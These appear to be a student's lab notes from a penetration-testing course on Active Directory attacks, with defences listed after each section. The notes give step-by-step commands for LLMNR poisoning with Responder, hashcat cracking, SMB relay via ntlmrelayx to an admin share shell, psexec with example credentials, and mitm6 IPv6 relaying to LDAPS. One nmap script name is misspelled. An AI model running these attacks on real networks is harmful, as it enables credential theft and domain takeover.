[*] Initial Attack Vectors(Active Directory)

[*] LLMNR Poisoning

[*] LLMNR = Link-Local Multicast Name Resolution
[*] Was Previously Known As NBT-NS
[*] Key Flaw: The Services Utilize A User's Username And NTLMv2 Hash When Appropriately Responded To
[*] This Is A Kind Of MITM Attack
[*] Setps:

[*] Capturing NTLMv2 Hashes With Responder:

[*] Responder: https://github.com/SpiderLabs/Responder

[+] On Our Kali Machine, Run The Following Command

responder -I <Interface> -rdw

[*] Example: responder -I eth0 -rdwv

[*] Now As We Are n00bs. On Our Windows User Machine, Open Up Explorer Are Type On The Navigation Bar:

\\<Responder IP>

[*] Now On The Windows Machine You Will Get A Window Poped Up Saying Enter Credentials And Access Is Denied
[*] No Problem As We Got Our Hashes On Our Kali Machine. Copy The Full Hash Including The Root Domain Name, Username And Everything. 

[*] Password Cracking With Hashcat:

[*] Paste Your Hash In A Text File(.txt)
[*] We Are Going To Use The Rockyou Wordlist(Built-In In Kali)
[*] Command:

hashcat -m 5600 <HashFile.txt> <Wordlist> --force

[*] This May Not Work. If This Doesn't Work, Download Hashcat On Your Windows Machine(Host) As Our Virtual Machines Have Less Memory Access
[*] You Have To Run The Command In Command Prompt(As Administrator)
[*] But Berfore Running Be Sure To Copy Rockyou To The Windows Machine
[*] The Command:

hashcat.exe -m 5600 <HashFile.txt> <Wordlist> -O

[*] Success! Hash Was Cracked

[*] Defences:

[*] Best Defence: Disable LLMNR And NBT-NS
[*] If Not Possible: Require Network Access Control And Use Harder Password. Passsword > 14 Characters

[*] SMB Relay Attacks:

[*] Explaination:

[*] Instead Of Cracking Hashes Gathered With Responder, We Can Instead Relay Those Hashes To Specific Machines And Potentially Gain Access. 

[*] Requirements:

[*] SMB Signing Must Be Disabled
[*] Relayed User Credentials Must Be An Admin On Machine

[*] To Do This You May Have To Modify The Responder.conf File. 

[Responder Core]

; Servers To Start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On

[*] Here Make Sure That SMB And HTTP Are "Turned Off"
[*] Now Here, For Doing This Attack We Will Need Another Tool Called ntlmrelayx:

https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py

[*] Lab Update

[*] So For The Attack To Run Successfully, We Will Need To Do A Quick Lab Change. That Is: We Will Have To Turn On Network Discovery
[*] For That Open Quick Access And Click On The Network Folder On The Left
[*] Hit Ok And There Should Be A Message On Top. In That Message Click On: Click To Change; And Turn On Network Discovery And File Sharing
[*] Do This To Both The Windows Machines

[*] Finding If The Targets Are Vulnerable To This Attack

[*] For This, You Can Use NMAP Or Nessus. We Will Use Nmap Here
[*] Command:

nmap --script=smb2-secuity-mode.nse -p445 <Target IP>/24

[*] In The Result, We Clearly See That Message Signing Is Enabled On Our Server, But In Both The Machines, It Is Enabled But Not Required(We Can Still Do The Attack)! Success!
[*] Now We Will Make A Text File, We Will Add IP Address Of One Of Our Target. 

[*] Attacking:

[*] Note: In Order To Run This Attack, We Will Have To Attack The User Who Was Admin On Both The User Devices
[*] Again, Check That The Responder Changes Are Made
[*] Lets Run Responder:

responder -I <Interface> -rdwv

[*] Now Lets Relay Using ntlmrelayx

ntlmrelayx.py -tf <File With Target IP> -smb2support

[*] Now, Like Before Head To The Victim Machine(Of Which The IP In The File Is) And In The File Explorer Type: \\<Attacker IP>
[*] You May Get An Error On The Windows Machine But, On Our Kali Machine, We Get The Hashes!

[*] Improved

[*] Here We Have To Gain A Shell But We Have To Make Only One Change! 
[*] Run The Same Above Steps But In The ntlmrelayx.py Add An Extra Switch

ntlmrelayx.py -tf <File With Target IP> -smb2support -i

[*] Now Here Some Information Should Be Displayed When The Connection Occurs
[*] Now Lets Netcat By Using The Information We Got(There Should Be A Line Where It Says SMB Shell Started Or Something Like That)
[*] Example:

nc 127.0.0.1 11000

[*] We Got An SMB Share Shell!
[*] Lets Test It. 

shares

[*] This Will Display The Available Shares
[*] And 

use

[*] Will Help Use Migrate To A Share

use ADMIN$

[*] We Are Admin

use C$

[*] We Are In The C Drive!

[*] We Can Also Add A Switch: -c; Using Which We Can Run Commands(I Mean, A Reverse Shell!)

[*] Defenses:

[+] Enable SMB Signing On All Devices
[+] Disable NTLM Authentication On Network
[+] Account Tiering
[+] Local Admin Restriction

[*] Gaining Shell By Using The Information That We Gained Till Now

[*] As We Have Credentials And SMB Is Open, Let's Get A Shell Using psexec. (Already Used In Mid-Course Capstone)

psexec.py <Domian>.local/<Username>:<Password>@<Target Ip>

[*] Example

psexec.py MARVEL.local/fcastle:Password1@192.168.57.141

[*] Tip: First Try Using wmiexec And smbexec Before Running psexec

[*] IPv6 Attacks

[*] For This Attack, We Will MITM6

https://github.com/fox-it/mitm6

[*] Installation

pip3 install .

[*] Wait A Second

[*] Setting Up LDAPS(On Our Server)

1. Open Server Manager
2. Click On Manage
3. Click On Add Roles And Features
4. Click Next 3 Times
5. From The List, Select Active Directory Certificate Services
6. Select Add Features
7. Click Next 4 Times
8. And Select The Option: Restart The Destination Server Automatically If Requires
9. Click Yes
10. Hit Install
11. Close The Window After Installation
12. Click On The Flag With The Alert Symbol And Click On Configure Active Directory Certificate Services..
13. Click On Next
14. Click On Certificate Authority
15. Hit Enter 5-6 Times(If Shown, Select SHA256 From The List)
16. In The Time Period, Change It To 99 Years
17. Hit Next 2 Times
18. Click Configure
19. Reboot The Server

[*] Attacking

[*] Command:

mitm6 -d <DomainName>.local
mitm6 -d MARVEL.local

[*] We Also Have To Setup A Relay Attack:

ntlmrelayx.py -6 -t ldaps://<Domain Controller IP> -wh fakewpad.<DomainName>.local -l lootme
ntlmrelayx.py -6 -t ldaps://192.168.57.140 -wh fakewpad.marvel.local -l lootme

[*] Reboot The Windows Machine As Our Attack Will Be Finished Faster
[*] The Attack Starts Running And As You Can See That A lootme Folder Created Which Has A Lot Of Information

[*] Lets Open domain_users_by_groups
[*] And What, We Got The Password Of Our SQLService Which Was In The Description!
[*] Now Login Using Administrator Account On The Domain Server
[*] We Ran The Attack And A New User Was Created For Us!
[*] Useful Links

https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/
https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

[*] Defenses

[*] Disable IPv6(Not Recommended)
[*] Make Block Rules For Your Firewall
[*] If WPAD Is Not Used, Disable It
[*] Enable LDAP Signing And LDAP Channel Binding
[*] Add Administrator To Protected Users Group

[*] Other Attack Vectors And Stratagies

[+] Stratigies

1. Begin The Day With mitm6 And Responder
2. Run Scans To Generate Traffic
3. If Scans Take Too Long, Look For Websites In Scope(Tool: http_version[Metasploit])
4. Try Default Credentials On Web Logins
5. Think Outside The Box